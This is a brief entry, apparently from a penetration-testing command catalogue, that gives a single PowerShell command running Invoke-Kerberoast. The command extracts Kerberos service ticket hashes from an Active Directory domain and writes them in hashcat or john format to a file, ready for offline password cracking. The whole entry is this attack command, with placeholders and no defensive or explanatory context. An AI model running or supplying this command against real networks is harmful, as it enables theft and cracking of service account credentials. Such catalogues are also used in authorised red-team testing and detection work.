---
id: 51c80060-022d-4672-99b8-ec8b2b244d09
name: execute invoke-kerberoast.ps1
type: command
executor: bash
data: 'invoke-kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash
  } | Out-File -Encoding ASCII <output_TGSs_file>

  '
output: null
created_at: '2020-07-14T18:14:30.853902+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# execute invoke-kerberoast.ps1

```bash
invoke-kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

```


